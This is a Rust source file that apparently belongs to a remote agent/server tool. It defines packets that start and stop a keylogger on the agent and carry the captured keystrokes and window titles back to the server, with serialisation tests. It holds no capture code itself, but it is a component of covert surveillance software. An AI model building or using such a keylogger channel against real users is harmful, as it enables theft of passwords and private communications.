use crate::Packet;
use bincode::{Decode, Encode};

/// Action to perform on the keylogger
#[derive(Debug, Clone, Copy, PartialEq, Eq, Encode, Decode)]
pub enum KeyloggerAction {
    /// Start capturing keystrokes
    Start,
    /// Stop capturing keystrokes
    Stop,
}

/// Request to start or stop the keylogger on the agent
#[derive(Debug, Clone, Encode, Decode, Packet)]
#[packet(code = 0x0D)]
pub struct KeyloggerRequest {
    pub action: KeyloggerAction,
}

impl KeyloggerRequest {
    /// Create a request to start the keylogger
    #[must_use]
    pub fn start() -> Self {
        Self {
            action: KeyloggerAction::Start,
        }
    }

    /// Create a request to stop the keylogger
    #[must_use]
    pub fn stop() -> Self {
        Self {
            action: KeyloggerAction::Stop,
        }
    }
}

/// Keylogger data sent from agent to server
#[derive(Debug, Clone, Encode, Decode, Packet)]
#[packet(code = 0x0E)]
pub struct KeyloggerData {
    /// UTF-8 encoded keystroke data (includes window titles and key labels)
    pub data: Vec<u8>,
}

impl KeyloggerData {
    /// Create a new keylogger data packet
    #[must_use]
    pub fn new(data: Vec<u8>) -> Self {
        Self { data }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::packets::Packet;

    #[test]
    fn keylogger_request_start() {
        let req = KeyloggerRequest::start();
        assert_eq!(req.action, KeyloggerAction::Start);
    }

    #[test]
    fn keylogger_request_stop() {
        let req = KeyloggerRequest::stop();
        assert_eq!(req.action, KeyloggerAction::Stop);
    }

    #[test]
    fn keylogger_request_roundtrip() {
        let req = KeyloggerRequest::start();
        let bytes = req.serialize().unwrap();
        let decoded = KeyloggerRequest::deserialize(&bytes[1..]).unwrap();
        assert_eq!(decoded.action, KeyloggerAction::Start);
    }

    #[test]
    fn keylogger_data_roundtrip() {
        let data = KeyloggerData::new(vec![0x41, 0x42, 0x43]);
        let bytes = data.serialize().unwrap();
        let decoded = KeyloggerData::deserialize(&bytes[1..]).unwrap();
        assert_eq!(decoded.data, vec![0x41, 0x42, 0x43]);
    }

    #[test]
    fn keylogger_data_empty() {
        let data = KeyloggerData::new(vec![]);
        let bytes = data.serialize().unwrap();
        let decoded = KeyloggerData::deserialize(&bytes[1..]).unwrap();
        assert!(decoded.data.is_empty());
    }

    #[test]
    fn packet_codes_are_correct() {
        assert_eq!(KeyloggerRequest::packet_code(), 0x0D);
        assert_eq!(KeyloggerData::packet_code(), 0x0E);
    }
}
